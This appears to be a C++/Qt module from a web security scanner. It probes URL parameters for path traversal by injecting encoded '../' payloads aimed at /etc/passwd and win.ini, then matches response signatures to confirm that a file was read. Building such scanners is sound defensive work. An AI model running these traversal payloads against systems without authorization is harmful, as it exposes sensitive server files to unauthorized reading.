#include "path_traversal.hpp"
#include "networking.hpp"

#include <QRegularExpression>
#include <QUrlQuery>

namespace Nullock::Core::PathTraversal {

namespace {

struct Target {
    const char *name;        // display
    QRegularExpression sig;  // content fingerprint
    QStringList suffixes;    // file path tails to traverse to
};

const QList<Target> &targets() {
    static const QList<Target> t = {
        // Line-scoped and multi-field so a passing mention of "root:x:0:0:"
        // in prose doesn't match -- this is the shape of a real passwd line.
        { "/etc/passwd",
          QRegularExpression("root:[^:\\n]*:0:0:[^:\\n]*:[^:\\n]*:"),
          { "etc/passwd" } },
        { "windows/win.ini",
          QRegularExpression("\\[(?:fonts|extensions|mci extensions)\\]",
                             QRegularExpression::CaseInsensitiveOption),
          { "windows/win.ini", "windows\\win.ini" } },
    };
    return t;
}

// Encodings of "../" (and "..\") a vulnerable resolver might accept, applied
// as a prefix repeated deep enough to reach the filesystem root.
struct Encoding {
    const char *technique;
    QString (*depth)(int);   // build the traversal prefix for N levels
    bool windows;            // pairs with backslash suffix
};

QString rep(const QString &unit, int n) {
    QString s; for (int i = 0; i < n; ++i) s += unit; return s;
}

const QList<Encoding> &encodings() {
    static const QList<Encoding> e = {
        { "dotdot",         [](int n){ return rep("../", n); },        false },
        { "encoded",        [](int n){ return rep("%2e%2e%2f", n); },  false },
        { "nested",         [](int n){ return rep("....//", n); },     false },
        { "double-encoded", [](int n){ return rep("..%252f", n); },    false },
        { "backslash",      [](int n){ return rep("..\\", n); },       true  },
        { "encoded-bslash", [](int n){ return rep("..%5c", n); },      true  },
    };
    return e;
}

// Cap the bytes matched -- a greedy signature over a multi-MB body can
// backtrack badly, and the fingerprint is near the top of a served file anyway.
constexpr int kMaxBody = 512 * 1024;
// A whole scan is bounded to this many sends so a slow/blackholing host can't
// stall the (synchronous) endpoint for minutes across the payload matrix.
constexpr int kMaxSends = 90;

QString headerlessSig(const Target &tgt, const QByteArray &body) {
    const auto m = tgt.sig.match(QString::fromUtf8(body.left(kMaxBody)));
    return m.hasMatch() ? m.captured(0) : QString();
}

QByteArray buildRequest(const Request &req, const QString &query) {
    const QString target = query.isEmpty() ? req.basePath : req.basePath + "?" + query;
    QByteArray out;
    out  = req.method.toUtf8() + " " + target.toUtf8() + " HTTP/1.1\r\n";
    out += "Host: " + req.host.toUtf8() + "\r\n";
    out += "User-Agent: Nullock/path-traversal\r\n";
    out += "Accept: */*\r\n";
    out += "Accept-Encoding: identity\r\n";
    for (const auto &h : req.headers) {
        if (h.first.compare("Host", Qt::CaseInsensitive) == 0) continue;
        if (h.first.contains('\r') || h.first.contains('\n')) continue;
        if (h.second.contains('\r') || h.second.contains('\n')) continue;
        out += h.first.toUtf8() + ": " + h.second.toUtf8() + "\r\n";
    }
    out += "Connection: close\r\n\r\n";
    return out;
}

// Splice the raw (already-encoded) value into the query, preserving others.
QString queryWith(const QString &existing, const QString &param, const QString &rawValue) {
    QStringList parts;
    const QUrlQuery q(existing);
    for (const auto &kv : q.queryItems(QUrl::FullyEncoded))
        if (QUrl::fromPercentEncoding(kv.first.toUtf8()) != param)
            parts << kv.first + "=" + kv.second;
    parts << param + "=" + rawValue;
    return parts.join('&');
}

} // namespace

QStringList defaultParams() {
    return { "file", "path", "page", "template", "doc", "document", "name",
             "filename", "download", "view", "include", "lang", "dir", "load" };
}

Result test(const Request &reqIn) {
    Result result;
    if (reqIn.host.isEmpty()) { result.error = "host required"; return result; }
    Request req = reqIn;
    if (req.basePath.isEmpty()) req.basePath = QStringLiteral("/");

    QStringList params;
    if (!req.param.isEmpty()) {
        params << req.param;
    } else {
        const QUrlQuery q(req.query);
        for (const auto &kv : q.queryItems())
            if (!params.contains(kv.first)) params << kv.first;
        if (params.isEmpty()) params = defaultParams();
    }
    while (params.size() > 6) params.removeLast();
    result.testedParams = params;

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    auto send = [&](const QString &query) {
        ++result.requestsSent;
        return client.send(req.host, port, req.tls, buildRequest(req, query));
    };

    const auto base = send(req.query);
    if (!base.ok) { result.error = "baseline failed: " + base.errorMessage; return result; }
    result.baselineStatus = base.parsed.statusCode;

    // A signature already present at baseline can't be attributed to us.
    QList<Target> usable;
    for (const Target &tgt : targets())
        if (headerlessSig(tgt, base.parsed.body).isEmpty()) usable << tgt;

    // One deep level reaches the filesystem root from any realistic app depth;
    // extra "../" past root are harmless, so a single depth keeps the matrix
    // (and the wall-clock against a slow host) bounded.
    static const QList<int> depths = { 8 };

    for (const QString &param : params) {
        if (result.requestsSent >= kMaxSends) break;
        bool paramHit = false;
        for (const Target &tgt : usable) {
            for (const Encoding &enc : encodings()) {
                for (const QString &suffix : tgt.suffixes) {
                    if (enc.windows != suffix.contains('\\')) continue;
                    for (int d : depths) {
                        if (result.requestsSent >= kMaxSends) { paramHit = true; break; }
                        const QString payload = enc.depth(d) + suffix;
                        const auto r = send(queryWith(req.query, param, payload));
                        if (!r.ok) continue;
                        const QString sig = headerlessSig(tgt, r.parsed.body);
                        if (!sig.isEmpty()) {
                            result.hits.append({ param, QString::fromUtf8(enc.technique),
                                                 QString::fromUtf8(tgt.name), payload, sig });
                            result.vulnerable = true;
                            paramHit = true;
                            break;
                        }
                    }
                    if (paramHit) break;
                }
                if (paramHit) break;
            }
            if (paramHit) break;   // one confirmed file read per param is enough
        }
    }

    return result;
}

} // namespace Nullock::Core::PathTraversal
